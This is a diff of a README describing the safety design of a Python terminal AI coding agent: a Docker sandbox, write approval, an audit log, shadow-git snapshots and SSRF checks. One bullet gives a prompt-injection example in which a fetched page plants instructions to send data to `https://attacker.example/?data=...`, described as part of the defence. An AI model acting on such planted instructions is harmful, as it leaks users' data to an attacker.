@@ -17,7 +17,7 @@ A terminal AI coding agent, built from scratch in Python. It reads and edits cod
 - Shell commands run in a Docker sandbox: the container sees only the project, has no network or host environment (no API keys), no privileges, and capped memory, CPU, and processes. Commands inside it need no approval; one that asks for the network or for the host does.
 - File writes go through human approval (HITL) and path isolation; commands also through dangerous-command blocking; everything through a JSONL audit log.
 - Edits need a unique match and refuse files that were never read or changed since they were read.
-- A workspace snapshot is taken just before a request's first approved write, so a whole turn can be rolled back; read-only requests cost nothing.
+- A workspace snapshot is taken just before a request's first approved write, so a whole turn can be rolled back, shell and parallel workers' changes included; read-only requests cost nothing. Snapshots live in a shadow git repository under `AGENTCLI_HOME` (never the project's own `.git`), so each stores only what changed: about 0.3 s after the first, which takes about 2 s for this repository instead of 53 s as a full copy. The project's `.gitignore` is honored and the bytes come back exactly.
 - `web_fetch` allows only public addresses and re-checks every redirect hop (SSRF protection). Because a fetch can also carry data out in its URL (a page with planted instructions asking for `https://attacker.example/?data=...`), the first fetch from a site not yet approved asks; you can allow it once or for the project from then on (`d`), a few documentation sites are allowed from the start (`web.allowed_domains` adds more), and a redirect to an unapproved site is not followed.
 
 **Context and prompt caching**
